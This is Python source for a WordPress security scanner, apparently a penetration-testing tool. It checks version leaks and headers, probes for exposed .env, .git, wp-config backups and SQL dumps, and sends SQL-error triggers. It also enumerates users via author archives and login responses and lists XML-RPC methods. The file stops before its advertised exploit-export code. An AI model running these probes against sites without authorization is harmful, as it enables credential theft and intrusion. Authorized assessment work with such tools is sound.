#!/usr/bin/env python3
"""
W.A.D.U.H. Scanner v2.2 - Exploitation Export Edition
WordPress Analysis & Debugging Utility Helper
AUTHORIZED USE ONLY - DO NOT SCAN TARGETS WITHOUT PERMISSION
"""

import requests
import json
import sys
import re
import os
import argparse
import time
import urllib3
from urllib.parse import urlparse
from datetime import datetime, timezone
from requests.exceptions import SSLError, ConnectionError, ReadTimeout
from colorama import Fore, Style, init
from typing import Dict, List, Tuple, Optional

# Initialize colorama for terminal colors
init(autoreset=True)

# Disable warning for self-signed SSL (common in internal testing)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class YikesScanner:
    """WordPress Security Scanner for Authorized Testing"""

    def __init__(self, args: argparse.Namespace):
        self.target_url: str = ""
        self.wp_version: Optional[str] = None
        self.api_data: Optional[Dict] = None
        self.endpoints_info: List[Dict] = []
        self.summary: Dict = {}
        self.initial_response: Optional[requests.Response] = None
        self.homepage_html: str = ""

        # Configuration from args
        self.verify_ssl: bool = args.verify_ssl
        self.verbose: bool = args.verbose
        self.quiet: bool = args.quiet
        self.rate_limit: float = args.rate_limit
        self.deep_scan: bool = args.deep
        self.output_dir: str = args.output
        self.wpscan_token: Optional[str] = args.wpscan_token or os.getenv('WPSCAN_API_TOKEN')

        # Export options
        self.export_metasploit: bool = args.export_metasploit
        self.export_sqlmap: bool = args.export_sqlmap
        self.generate_pocs: bool = args.generate_pocs

        # Findings storage
        self.vulnerabilities: List[Dict] = []
        self.info_leaks: List[Dict] = []
        self.security_issues: List[Dict] = []

        # WPScan data
        self.wpscan_enabled: bool = self.wpscan_token is not None
        self.detected_plugins: List[Dict] = []
        self.detected_themes: List[Dict] = []

        # Enumeration data for exploitation
        self.found_users: List[str] = []
        self.xmlrpc_enabled: bool = False
        self.dangerous_xmlrpc_methods: List[str] = []
        self.sql_injection_params: List[str] = []

        # UPDATED HEADERS: Mimic a real Chrome Browser
        self.headers = {
            'User-Agent': (
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/120.0.0.0 Safari/537.36'
            ),
            'Accept': (
                'text/html,application/xhtml+xml,application/xml;'
                'q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
            ),
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
        }

    def banner(self) -> None:
        """Display scanner banner"""
        if not self.quiet:
            print(Fore.CYAN + Style.BRIGHT + r"""
    ========================================
      W.A.D.U.H. SCANNER v2.2 - Exploitation Export Edition
(Wordpress Analysis & Debugging Utility Helper)
    ========================================
    [!] AUTHORIZED USE ONLY
    [!] DO NOT SCAN TARGETS WITHOUT PERMISSION
    ========================================
            """)
            if self.wpscan_enabled:
                print(Fore.GREEN + "    [+] WPScan API: Enabled")
            else:
                print(Fore.YELLOW + "    [-] WPScan API: Disabled (use --wpscan-token)")

            # Show export features
            exports = []
            if self.export_metasploit:
                exports.append("Metasploit")
            if self.export_sqlmap:
                exports.append("SQLMap")
            if self.generate_pocs:
                exports.append("PoCs")

            if exports:
                print(Fore.GREEN + f"    [+] Export Modes: {', '.join(exports)}")
            print(Fore.GREEN + "    [+] Exploitation Guide: Always generated")

    def log(self, message: str, color=Fore.WHITE, level: str = "info") -> None:
        """Log messages with verbosity control"""
        if self.quiet and level == "info":
            return
        if not self.verbose and level == "debug":
            return
        print(color + message)

    def add_vulnerability(self, title: str, description: str, severity: str = "medium") -> None:
        """Track discovered vulnerabilities"""
        self.vulnerabilities.append({
            "title": title,
            "description": description,
            "severity": severity,
            "timestamp": datetime.now(timezone.utc).isoformat()
        })

    def add_info_leak(self, title: str, description: str) -> None:
        """Track information leaks"""
        self.info_leaks.append({
            "title": title,
            "description": description,
            "timestamp": datetime.now(timezone.utc).isoformat()
        })

    def add_security_issue(self, title: str, description: str) -> None:
        """Track security misconfigurations"""
        self.security_issues.append({
            "title": title,
            "description": description,
            "timestamp": datetime.now(timezone.utc).isoformat()
        })

    def apply_rate_limit(self) -> None:
        """Apply rate limiting between requests"""
        if self.rate_limit > 0:
            time.sleep(self.rate_limit)

    def make_request(self, url: str, timeout: Tuple[int, int] = (5, 20),
                    method: str = "GET", **kwargs) -> Optional[requests.Response]:
        """Helper method for making HTTP requests with consistent settings"""
        self.apply_rate_limit()
        try:
            if method.upper() == "GET":
                return requests.get(
                    url,
                    headers=self.headers,
                    verify=self.verify_ssl,
                    timeout=timeout,
                    **kwargs
                )
            elif method.upper() == "POST":
                return requests.post(
                    url,
                    headers=self.headers,
                    verify=self.verify_ssl,
                    timeout=timeout,
                    **kwargs
                )
            elif method.upper() == "HEAD":
                return requests.head(
                    url,
                    headers=self.headers,
                    verify=self.verify_ssl,
                    timeout=timeout,
                    **kwargs
                )
        except Exception as e:
            self.log(f"[!] Request error for {url}: {e}", Fore.RED, "debug")
            return None

    def get_input(self) -> None:
        """Get URL input from the user"""
        url = input(
            Fore.YELLOW
            + "[?] Enter Target URL (e.g., http://localhost or https://example.com): "
        ).strip()

        # Simple validation to ensure schema exists
        if not url.startswith("http"):
            url = "http://" + url

        # Remove trailing slash for consistency
        self.target_url = url.rstrip('/')
        self.log(f"[*] Target set to: {self.target_url}\n", Fore.GREEN)

    # ---------------- BASIC CONNECTIVITY ----------------

    def check_connection(self) -> bool:
        """Check if the server is reachable"""
        self.log(f"[*] Attempting to connect to: {self.target_url} ...", Fore.YELLOW)

        try:
            r = self.make_request(self.target_url, timeout=(5, 30), allow_redirects=True)

            if not r:
                return False

            self.initial_response = r

            # Treat 2xx and 3xx as "reachable"
            if 200 <= r.status_code < 400:
                self.log(f"[+] Connection Established! (HTTP {r.status_code})", Fore.GREEN)
                server = r.headers.get("Server")
                if server:
                    self.log(f"    Server header: {server}", Fore.CYAN)
                    self.add_info_leak("Server Header Exposed", f"Server: {server}")
                return True
            else:
                self.log(
                    f"[-] Server reachable, but responded with status code: {r.status_code}",
                    Fore.RED
                )
                return False

        except SSLError:
            self.log("[!] SSL Certificate Error.", Fore.RED)
            self.log(
                "    [Tip] If this is an internal server, try --verify-ssl flag.",
                Fore.YELLOW
            )
            return False

        except ReadTimeout:
            self.log("[!] Connection timed out while waiting for a response.", Fore.RED)
            self.log(
                "    [Tip] Target may be slow or blocking you. Try increasing timeout or scanning later.",
                Fore.YELLOW
            )
            return False

        except ConnectionError as e:
            self.log("[!] Connection Failed.", Fore.RED)
            self.log(f"    Detail: {e}", Fore.WHITE)
            return False

        except Exception as e:
            self.log(f"[!] Unexpected Error: {e}", Fore.RED)
            return False

    # ---------------- WP VERSION & BASIC ENUM ----------------

    def detect_version(self) -> None:
        """Detect WordPress version using multiple methods"""
        self.log("[*] Attempting to detect WordPress version...", Fore.BLUE)

        version_found = False

        # Method 1: Check meta generator tag
        try:
            r = self.make_request(self.target_url, timeout=(5, 20))
            if r and r.status_code == 200:
                self.homepage_html = r.text

                # Multiple regex patterns for version detection
                patterns = [
                    r'content="WordPress (\d+\.\d+(?:\.\d+)?)"',
                    r'<meta name="generator" content="WordPress (\d+\.\d+(?:\.\d+)?)"',
                    r'WordPress (\d+\.\d+(?:\.\d+)?)',
                ]

                for pattern in patterns:
                    match = re.search(pattern, r.text, re.IGNORECASE)
                    if match:
                        self.wp_version = match.group(1)
                        self.log(f"[+] WordPress Version Detected: {self.wp_version}", Fore.GREEN)
                        self.add_info_leak("WordPress Version Exposed", f"Version: {self.wp_version}")
                        version_found = True
                        break

        except Exception as e:
            self.log(f"[!] Error detecting version from HTML: {e}", Fore.RED, "debug")

        # Method 2: Check readme.html
        if not version_found:
            self.log("[*] Checking readme.html for version...", Fore.YELLOW, "debug")
            readme_url = f"{self.target_url}/readme.html"
            r = self.make_request(readme_url, timeout=(5, 15))
            if r and r.status_code == 200:
                match = re.search(r'Version (\d+\.\d+(?:\.\d+)?)', r.text)
                if match:
                    self.wp_version = match.group(1)
                    self.log(f"[+] WordPress Version from readme.html: {self.wp_version}", Fore.GREEN)
                    self.add_info_leak("Version in readme.html", f"Version: {self.wp_version}")
                    version_found = True

        # Method 3: Check RSS feed
        if not version_found and self.deep_scan:
            self.log("[*] Checking RSS feed for version...", Fore.YELLOW, "debug")
            rss_url = f"{self.target_url}/feed/"
            r = self.make_request(rss_url, timeout=(5, 15))
            if r and r.status_code == 200:
                match = re.search(r'generator[=>]*WordPress (\d+\.\d+(?:\.\d+)?)', r.text, re.IGNORECASE)
                if match:
                    self.wp_version = match.group(1)
                    self.log(f"[+] WordPress Version from RSS: {self.wp_version}", Fore.GREEN)
                    self.add_info_leak("Version in RSS Feed", f"Version: {self.wp_version}")
                    version_found = True

        if version_found:
            self.check_cve_link()
        else:
            self.log(
                "[-] WordPress Version is hidden (Good security practice).",
                Fore.YELLOW
            )

    def check_cve_link(self) -> None:
        """Provide CVE links and check if version is outdated"""
        self.log("[*] Vulnerability Analysis (CVE):", Fore.MAGENTA)
        if self.wp_version:
            cve_url = (
                "https://www.cvedetails.com/vulnerability-list/"
                f"vendor_id-2337/product_id-4096/version-{self.wp_version}/"
                "WordPress-WordPress.html"
            )
            self.log("    Check CVEs for this version at:", Fore.CYAN)
            self.log(f"    -> {cve_url}", Fore.CYAN)

            # Check if version is old (simple heuristic)
            try:
                major, minor = map(int, self.wp_version.split('.')[:2])
                if major < 6 or (major == 6 and minor < 4):
                    self.log(
                        "    [!] WARNING: This appears to be an outdated WordPress version!",
                        Fore.RED
                    )
                    self.add_vulnerability(
                        "Outdated WordPress Version",
                        f"Version {self.wp_version} is outdated and likely has known vulnerabilities",
                        "high"
                    )
            except:
                pass

            self.log(
                "    [Tip] Older versions likely have known vulnerabilities.",
                Fore.YELLOW
            )

            # Check WPScan database if enabled
            if self.wpscan_enabled:
                self.check_wpscan_wordpress_vuln()
        else:
            self.log("    Cannot generate CVE link because version is unknown.")

    # ---------------- WPSCAN API INTEGRATION ----------------

    def wpscan_query_api(self, endpoint: str, params: Optional[Dict] = None) -> Optional[Dict]:
        """Query WPScan API with rate limiting and error handling"""
        if not self.wpscan_enabled:
            return None

        base_url = "https://wpscan.com/api/v3"
        url = f"{base_url}/{endpoint}"

        headers = {
            'Authorization': f'Token token={self.wpscan_token}',
            'User-Agent': 'WADUH Scanner v2.1'
        }

        try:
            self.apply_rate_limit()
            r = requests.get(url, headers=headers, params=params, timeout=10)

            if r.status_code == 200:
                return r.json()
            elif r.status_code == 401:
                self.log("    [!] WPScan API: Invalid token", Fore.RED)
                self.wpscan_enabled = False
                return None
            elif r.status_code == 429:
                self.log("    [!] WPScan API: Rate limit exceeded", Fore.YELLOW)
                return None
            elif r.status_code == 404:
                # No data found - not an error
                return None
            else:
                self.log(f"    [!] WPScan API error: HTTP {r.status_code}", Fore.RED, "debug")
                return None

        except Exception as e:
            self.log(f"    [!] WPScan API request failed: {e}", Fore.RED, "debug")
            return None

    def check_wpscan_wordpress_vuln(self) -> None:
        """Check WordPress core vulnerabilities using WPScan API"""
        if not self.wpscan_enabled or not self.wp_version:
            return

        self.log("\n[*] Checking WPScan database for WordPress core vulnerabilities...", Fore.BLUE)

        # Query WPScan API for WordPress version vulnerabilities
        data = self.wpscan_query_api(f"wordpresses/{self.wp_version}")

        if not data:
            self.log("    [-] No WPScan data available for this version", Fore.YELLOW, "debug")
            return

        vulnerabilities = data.get(self.wp_version, {}).get('vulnerabilities', [])

        if not vulnerabilities:
            self.log(f"    [+] No known vulnerabilities in WPScan database for WordPress {self.wp_version}", Fore.GREEN)
            return

        self.log(f"    [!] Found {len(vulnerabilities)} known vulnerabilities in WPScan database!", Fore.RED)

        for vuln in vulnerabilities:
            title = vuln.get('title', 'Unknown')
            vuln_type = vuln.get('vuln_type', 'Unknown')
            fixed_in = vuln.get('fixed_in', 'Not fixed')

            # Get CVE references
            references = vuln.get('references', {})
            cve = references.get('cve', [])
            wpvulndb = references.get('url', [])

            self.log(f"\n    [!] {title}", Fore.RED)
            self.log(f"        Type: {vuln_type}", Fore.YELLOW)
            self.log(f"        Fixed in: {fixed_in}", Fore.CYAN)

            if cve:
                self.log(f"        CVE: {', '.join(cve)}", Fore.MAGENTA)

            if wpvulndb and self.verbose:
                for url in wpvulndb[:2]:  # Show first 2 URLs
                    self.log(f"        Reference: {url}", Fore.CYAN, "debug")

            # Add to vulnerabilities list
            severity = "critical" if "rce" in vuln_type.lower() or "sql injection" in vuln_type.lower() else "high"
            self.add_vulnerability(
                f"WordPress Core: {title}",
                f"Type: {vuln_type}, Fixed in: {fixed_in}, CVE: {', '.join(cve) if cve else 'N/A'}",
                severity
            )

    def check_wpscan_plugin_vuln(self, plugin_slug: str, plugin_version: Optional[str] = None) -> None:
        """Check plugin vulnerabilities using WPScan API"""
        if not self.wpscan_enabled:
            return

        self.log(f"    [*] Checking WPScan database for {plugin_slug}...", Fore.YELLOW, "debug")

        # Query WPScan API for plugin vulnerabilities
        data = self.wpscan_query_api(f"plugins/{plugin_slug}")

        if not data:
            self.log(f"        [-] No WPScan data for {plugin_slug}", Fore.CYAN, "debug")
            return

        plugin_data = data.get(plugin_slug, {})
        vulnerabilities = plugin_data.get('vulnerabilities', [])
        latest_version = plugin_data.get('latest_version')
        last_updated = plugin_data.get('last_updated')
        popular = plugin_data.get('popular', False)

        if not vulnerabilities:
            self.log(f"        [+] No known vulnerabilities for {plugin_slug}", Fore.GREEN, "debug")
            return

        # Filter vulnerabilities by version if we have it
        relevant_vulns = []
        if plugin_version:
            for vuln in vulnerabilities:
                fixed_in = vuln.get('fixed_in')
                if not fixed_in or (plugin_version < fixed_in):
                    relevant_vulns.append(vuln)
        else:
            relevant_vulns = vulnerabilities

        if not relevant_vulns:
            self.log(f"        [+] Plugin version appears patched", Fore.GREEN, "debug")
            return

        self.log(f"        [!] Found {len(relevant_vulns)} vulnerabilities for {plugin_slug}!", Fore.RED)

        for vuln in relevant_vulns[:5]:  # Limit to 5 most relevant
            title = vuln.get('title', 'Unknown')
            vuln_type = vuln.get('vuln_type', 'Unknown')
            fixed_in = vuln.get('fixed_in', 'Not fixed')

            self.log(f"        [!] {title}", Fore.RED)
            self.log(f"            Type: {vuln_type}, Fixed in: {fixed_in}", Fore.YELLOW)

            # Determine severity
            severity = "high"
            if "rce" in vuln_type.lower() or "sql injection" in vuln_type.lower():
                severity = "critical"
            elif "xss" in vuln_type.lower() or "csrf" in vuln_type.lower():
                severity = "medium"

            self.add_vulnerability(
                f"Plugin {plugin_slug}: {title}",
                f"Type: {vuln_type}, Fixed in: {fixed_in}",
                severity
            )

    def check_wpscan_theme_vuln(self, theme_slug: str, theme_version: Optional[str] = None) -> None:
        """Check theme vulnerabilities using WPScan API"""
        if not self.wpscan_enabled:
            return

        self.log(f"    [*] Checking WPScan database for theme {theme_slug}...", Fore.YELLOW, "debug")

        # Query WPScan API for theme vulnerabilities
        data = self.wpscan_query_api(f"themes/{theme_slug}")

        if not data:
            self.log(f"        [-] No WPScan data for theme {theme_slug}", Fore.CYAN, "debug")
            return

        theme_data = data.get(theme_slug, {})
        vulnerabilities = theme_data.get('vulnerabilities', [])

        if not vulnerabilities:
            self.log(f"        [+] No known vulnerabilities for theme {theme_slug}", Fore.GREEN, "debug")
            return

        # Filter vulnerabilities by version if we have it
        relevant_vulns = []
        if theme_version:
            for vuln in vulnerabilities:
                fixed_in = vuln.get('fixed_in')
                if not fixed_in or (theme_version < fixed_in):
                    relevant_vulns.append(vuln)
        else:
            relevant_vulns = vulnerabilities

        if not relevant_vulns:
            self.log(f"        [+] Theme version appears patched", Fore.GREEN, "debug")
            return

        self.log(f"        [!] Found {len(relevant_vulns)} vulnerabilities for theme {theme_slug}!", Fore.RED)

        for vuln in relevant_vulns[:5]:  # Limit to 5 most relevant
            title = vuln.get('title', 'Unknown')
            vuln_type = vuln.get('vuln_type', 'Unknown')
            fixed_in = vuln.get('fixed_in', 'Not fixed')

            self.log(f"        [!] {title}", Fore.RED)
            self.log(f"            Type: {vuln_type}, Fixed in: {fixed_in}", Fore.YELLOW)

            severity = "high" if "xss" in vuln_type.lower() else "medium"

            self.add_vulnerability(
                f"Theme {theme_slug}: {title}",
                f"Type: {vuln_type}, Fixed in: {fixed_in}",
                severity
            )

    # ---------------- SECURITY HEADERS ----------------

    def check_security_headers(self) -> None:
        """Check common security-related HTTP headers"""
        self.log("[*] Checking security-related HTTP headers...", Fore.BLUE)

        if not self.initial_response:
            self.log("[-] No initial response captured; skipping header analysis.", Fore.YELLOW)
            return

        headers = self.initial_response.headers

        security_headers = {
            "Content-Security-Policy": "Helps prevent XSS attacks",
            "X-Frame-Options": "Prevents clickjacking",
            "X-Content-Type-Options": "Prevents MIME sniffing",
            "Strict-Transport-Security": "Enforces HTTPS",
            "Referrer-Policy": "Controls referrer information",
            "Permissions-Policy": "Controls browser features",
            "X-XSS-Protection": "Legacy XSS protection",
        }

        missing_headers = []
        for header, description in security_headers.items():
            val = headers.get(header)
            if val:
                self.log(f"    [+] {header}: {val}", Fore.GREEN, "debug")
            else:
                self.log(f"    [-] {header}: (missing) - {description}", Fore.RED)
                missing_headers.append(header)

        if missing_headers:
            self.add_security_issue(
                "Missing Security Headers",
                f"Missing headers: {', '.join(missing_headers)}"
            )

    # ---------------- WP ARTIFACT CHECKS ----------------

    def check_wp_artifacts(self) -> None:
        """Probe common WP endpoints"""
        self.log("[*] Checking common WordPress artifacts...", Fore.BLUE)

        paths = {
            "/wp-login.php": ("Login page", "info"),
            "/xmlrpc.php": ("XML-RPC endpoint", "warning"),
            "/readme.html": ("Default readme", "warning"),
            "/license.txt": ("License file", "info"),
            "/wp-admin/": ("Admin dashboard", "info"),
            "/wp-admin/install.php": ("Installation script", "critical"),
            "/wp-config.php": ("Config file", "critical"),
            "/wp-config.php.bak": ("Config backup", "critical"),
            "/wp-config.php.old": ("Old config", "critical"),
            "/wp-config.php~": ("Config temp file", "critical"),
        }

        for path, (desc, _) in paths.items():
            url = f"{self.target_url}{path}"
            r = self.make_request(url, timeout=(5, 15), allow_redirects=True)

            if not r:
                continue

            status = r.status_code
            line = f"    {desc} ({path}) -> HTTP {status}"

            # Risk assessment
            if path == "/xmlrpc.php" and status == 200:
                line += " [POTENTIAL RISK: xmlrpc enabled]"
                self.log(line, Fore.RED)
                self.add_vulnerability(
                    "XMLRPC Enabled",
                    "XMLRPC endpoint is accessible and may be vulnerable to brute force or DDoS attacks",
                    "medium"
                )
            elif path == "/readme.html" and status == 200:
                line += " [INFO LEAK: readme present]"
                self.log(line, Fore.YELLOW)
                self.add_info_leak("Readme.html Accessible", "Default WordPress readme file is accessible")
            elif path == "/wp-login.php" and status in (200, 302):
                line += " [Login page exposed]"
                self.log(line, Fore.CYAN)
            elif "wp-config" in path and status == 200:
                line += " [CRITICAL: Config file accessible!]"
                self.log(line, Fore.RED + Style.BRIGHT)
                self.add_vulnerability(
                    "Config File Exposed",
                    f"{path} is publicly accessible - IMMEDIATE ACTION REQUIRED",
                    "critical"
                )
            elif path == "/wp-admin/install.php" and status == 200:
                self.log(line + " [CRITICAL: Installation accessible!]", Fore.RED + Style.BRIGHT)
                self.add_vulnerability(
                    "Installation Script Accessible",
                    "WordPress installation script is accessible",
                    "high"
                )
            else:
                self.log(line, Fore.CYAN, "debug")

    # ---------------- DIRECTORY LISTING CHECKS ----------------

    def check_directory_listing(self) -> None:
        """Check for directory listing on common WP paths"""
        self.log("[*] Checking for directory listing in common paths...", Fore.BLUE)

        dirs = [
            "/wp-content/",
            "/wp-content/uploads/",
            "/wp-content/plugins/",
            "/wp-content/themes/",
            "/wp-includes/",
        ]

        for d in dirs:
            url = f"{self.target_url}{d}"
            r = self.make_request(url, timeout=(5, 15))

            if not r:
                continue

            if r.status_code == 200:
                # Multiple patterns for directory listing detection
                patterns = ["Index of /", "<title>Index of", "Parent Directory", "[To Parent Directory]"]
                if any(pattern in r.text for pattern in patterns):
                    self.log(
                        f"    [!] {d} appears to be browsable (Directory listing enabled)",
                        Fore.RED
                    )
                    self.add_security_issue(
                        "Directory Listing Enabled",
                        f"Directory listing is enabled for {d}"
                    )
                else:
                    self.log(f"    [+] {d} does not expose directory listing.", Fore.GREEN, "debug")
            else:
                self.log(f"    {d} -> HTTP {r.status_code}", Fore.CYAN, "debug")

    # ---------------- PLUGIN & THEME ENUM ----------------

    def enumerate_plugins_themes(self) -> None:
        """Extract plugin & theme names from homepage HTML"""
        self.log("[*] Enumerating plugins & themes from HTML...", Fore.BLUE)

        html = self.homepage_html or ""
        plugins = sorted(set(re.findall(r'/wp-content/plugins/([^/\'"?]+)', html)))
        themes = sorted(set(re.findall(r'/wp-content/themes/([^/\'"?]+)', html)))

        if plugins:
            self.log(f"    [+] Detected Plugins ({len(plugins)}):", Fore.MAGENTA)
            for p in plugins:
                self.log(f"      - {p}", Fore.CYAN)
                if self.deep_scan:
                    self.check_plugin_vulnerability(p)
        else:
            self.log("    [-] No plugins detected from HTML paths.", Fore.YELLOW)

        if themes:
            self.log(f"    [+] Detected Themes ({len(themes)}):", Fore.MAGENTA)
            for t in themes:
                self.log(f"      - {t}", Fore.CYAN)
                if self.deep_scan:
                    self.check_theme_vulnerability(t)
        else:
            self.log("    [-] No themes detected from HTML paths.", Fore.YELLOW)

    def check_plugin_vulnerability(self, plugin_name: str) -> None:
        """Check for common plugin vulnerabilities"""
        plugin_version = None

        # Check for readme.txt
        readme_url = f"{self.target_url}/wp-content/plugins/{plugin_name}/readme.txt"
        r = self.make_request(readme_url, timeout=(5, 10))

        if r and r.status_code == 200:
            self.log(f"        [!] {plugin_name} readme.txt is accessible", Fore.YELLOW, "debug")
            # Try to extract version
            version_match = re.search(r'Stable tag:\s*([0-9.]+)', r.text, re.IGNORECASE)
            if version_match:
                plugin_version = version_match.group(1)
                self.log(f"        Version: {plugin_version}", Fore.CYAN, "debug")

        # Check WPScan database for vulnerabilities
        if self.wpscan_enabled:
            self.check_wpscan_plugin_vuln(plugin_name, plugin_version)

        # Store detected plugin
        self.detected_plugins.append({
            'slug': plugin_name,
            'version': plugin_version
        })

    def check_theme_vulnerability(self, theme_name: str) -> None:
        """Check for common theme vulnerabilities"""
        theme_version = None

        # Check for style.css
        style_url = f"{self.target_url}/wp-content/themes/{theme_name}/style.css"
        r = self.make_request(style_url, timeout=(5, 10))

        if r and r.status_code == 200:
            # Try to extract version
            version_match = re.search(r'Version:\s*([0-9.]+)', r.text, re.IGNORECASE)
            if version_match:
                theme_version = version_match.group(1)
                self.log(f"        [!] {theme_name} version {theme_version} detected", Fore.YELLOW, "debug")

        # Check WPScan database for vulnerabilities
        if self.wpscan_enabled:
            self.check_wpscan_theme_vuln(theme_name, theme_version)

        # Store detected theme
        self.detected_themes.append({
            'slug': theme_name,
            'version': theme_version
        })

    # ---------------- SENSITIVE FILE DETECTION ----------------

    def check_sensitive_files(self) -> None:
        """Check for sensitive files and backups"""
        self.log("[*] Checking for sensitive files and backups...", Fore.BLUE)

        sensitive_files = [
            "/.git/HEAD",
            "/.git/config",
            "/.gitignore",
            "/.svn/entries",
            "/.env",
            "/.DS_Store",
            "/wp-config.php.bak",
            "/wp-config.php.old",
            "/wp-config.php.save",
            "/wp-config.php.swp",
            "/wp-config.txt",
            "/backup.sql",
            "/dump.sql",
            "/database.sql",
            "/db_backup.sql",
            "/wordpress.sql",
            "/.htaccess.bak",
            "/error_log",
            "/debug.log",
            "/php.ini",
            "/.user.ini",
        ]

        found_sensitive = []
        for file_path in sensitive_files:
            url = f"{self.target_url}{file_path}"
            r = self.make_request(url, timeout=(5, 10), allow_redirects=False)

            if r and r.status_code == 200:
                self.log(f"    [!] FOUND: {file_path} (HTTP {r.status_code})", Fore.RED)
                found_sensitive.append(file_path)

                severity = "critical" if any(x in file_path for x in ["wp-config", ".env", ".sql", ".git"]) else "medium"
                self.add_vulnerability(
                    f"Sensitive File Exposed: {file_path}",
                    f"Sensitive file {file_path} is publicly accessible",
                    severity
                )

        if not found_sensitive:
            self.log("    [+] No common sensitive files found (good!)", Fore.GREEN)

    # ---------------- ROBOTS.TXT & SITEMAP ----------------

    def check_robots_sitemap(self) -> None:
        """Check robots.txt and sitemap.xml for information"""
        self.log("[*] Checking robots.txt and sitemap.xml...", Fore.BLUE)

        # Check robots.txt
        robots_url = f"{self.target_url}/robots.txt"
        r = self.make_request(robots_url, timeout=(5, 10))

        if r and r.status_code == 200:
            self.log("    [+] robots.txt found:", Fore.GREEN)
            if self.verbose:
                for line in r.text.split('\n')[:20]:  # Show first 20 lines
                    if line.strip():
                        self.log(f"        {line}", Fore.CYAN, "debug")

            # Check for interesting disallows
            disallows = re.findall(r'Disallow:\s*(.+)', r.text, re.IGNORECASE)
            if disallows:
                self.log(f"    Found {len(disallows)} disallowed paths", Fore.YELLOW)

        # Check sitemap.xml
        sitemap_url = f"{self.target_url}/sitemap.xml"
        r = self.make_request(sitemap_url, timeout=(5, 10))

        if r and r.status_code == 200:
            self.log("    [+] sitemap.xml found", Fore.GREEN)
            # Count URLs in sitemap
            urls = re.findall(r'<loc>(.+?)</loc>', r.text)
            if urls:
                self.log(f"    Sitemap contains {len(urls)} URLs", Fore.CYAN)

    # ---------------- DATABASE ERROR DETECTION ----------------

    def check_database_errors(self) -> None:
        """Try to trigger database errors to detect misconfigurations"""
        self.log("[*] Checking for database error exposure...", Fore.BLUE)

        # Common SQL error triggers
        test_params = [
            "?p=1'",
            "?cat=1'",
            "?s=test'",
        ]

        error_patterns = [
            "SQL syntax",
            "mysql_fetch",
            "mysql_query",
            "Warning: mysql",
            "mysqli_",
            "database error",
            "PostgreSQL",
            "SQL Server",
        ]

        for param in test_params:
            url = f"{self.target_url}/{param}"
            r = self.make_request(url, timeout=(5, 10))

            if r and r.status_code == 200:
                for pattern in error_patterns:
                    if pattern.lower() in r.text.lower():
                        self.sql_injection_params.append(param)
                        self.log(
                            f"    [!] Potential database error detected with {param}",
                            Fore.RED
                        )
                        self.add_vulnerability(
                            "Database Error Disclosure",
                            f"Database errors are exposed to users (tested with {param})",
                            "medium"
                        )
                        return

        self.log("    [+] No obvious database error disclosure found", Fore.GREEN, "debug")

    # ---------------- USER ENUMERATION ----------------

    def test_user_enumeration(self) -> None:
        """Test for user enumeration vulnerabilities"""
        self.log("[*] Testing for user enumeration vulnerabilities...", Fore.BLUE)

        # Method 1: Author archive enumeration
        self.log("    Testing author archive enumeration...", Fore.YELLOW, "debug")
        found_users = []

        for user_id in range(1, 6):  # Test first 5 users
            url = f"{self.target_url}/?author={user_id}"
            r = self.make_request(url, timeout=(5, 10), allow_redirects=True)

            if r and r.status_code == 200:
                # Try to extract username from URL or content
                username_match = re.search(r'/author/([^/\'"]+)', r.url)
                if username_match:
                    username = username_match.group(1)
                    found_users.append(username)
                    self.found_users.append(username)
                    self.log(f"    [!] User found (ID {user_id}): {username}", Fore.YELLOW)

        if found_users:
            self.add_vulnerability(
                "User Enumeration via Author Archives",
                f"Found usernames: {', '.join(found_users)}",
                "low"
            )
            self.log(f"    [!] Found {len(found_users)} users via author enumeration", Fore.RED)
        else:
            self.log("    [+] Author enumeration appears to be blocked", Fore.GREEN, "debug")

        # Method 2: Check REST API for users (done in REST analysis)
        # Method 3: wp-login.php differential response
        if self.deep_scan:
            self.test_login_user_enum()

    def test_login_user_enum(self) -> None:
        """Test wp-login.php for user enumeration via differential responses"""
        self.log("    Testing wp-login.php for user enumeration...", Fore.YELLOW, "debug")

        login_url = f"{self.target_url}/wp-login.php"

        # Test with likely invalid username
        data1 = {"log": "nonexistentuser123456", "pwd": "wrongpass"}
        r1 = self.make_request(login_url, method="POST", data=data1, timeout=(5, 10), allow_redirects=False)

        # Test with common username
        data2 = {"log": "admin", "pwd": "wrongpass"}
        r2 = self.make_request(login_url, method="POST", data=data2, timeout=(5, 10), allow_redirects=False)

        if r1 and r2:
            # Check for different error messages
            if r1.text != r2.text:
                invalid_msg = "Invalid username" in r1.text or "is incorrect" in r1.text
                wrong_pwd_msg = "password" in r2.text.lower()

                if invalid_msg or wrong_pwd_msg:
                    self.log(
                        "    [!] Login form may leak user existence via error messages",
                        Fore.YELLOW
                    )
                    self.add_vulnerability(
                        "User Enumeration via Login Form",
                        "Login form provides different error messages for valid/invalid users",
                        "low"
                    )

    # ---------------- XMLRPC VULNERABILITY TESTING ----------------

    def test_xmlrpc_vulnerabilities(self) -> None:
        """Test XMLRPC endpoint for common vulnerabilities"""
        self.log("[*] Testing XMLRPC endpoint for vulnerabilities...", Fore.BLUE)

        xmlrpc_url = f"{self.target_url}/xmlrpc.php"

        # Check if XMLRPC is enabled
        r = self.make_request(xmlrpc_url, method="POST",
                             data="<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>",
                             timeout=(5, 15))

        if not r or r.status_code != 200:
            self.log("    [+] XMLRPC appears to be disabled or blocked", Fore.GREEN)
            return

        self.log("    [!] XMLRPC is enabled and responding", Fore.YELLOW)
        self.xmlrpc_enabled = True

        # Test 1: Check for available methods
        if "methodResponse" in r.text:
            methods = re.findall(r'<string>([^<]+)</string>', r.text)
            self.log(f"    Found {len(methods)} available XMLRPC methods", Fore.CYAN, "debug")

            # Check for dangerous methods
            dangerous_methods = ["pingback.ping", "system.multicall"]
            found_dangerous = [m for m in dangerous_methods if m in methods]

            if found_dangerous:
                self.dangerous_xmlrpc_methods = found_dangerous
                self.log(
                    f"    [!] Dangerous methods available: {', '.join(found_dangerous)}",
                    Fore.RED
                )
                self.add_vulnerability(
                    "XMLRPC Dangerous Methods Enabled",
                    f"XMLRPC has dangerous methods enabled: {', '.join(found_dangerous)}. Can be used for brute force amplification or DDoS",
                    "high"
                )

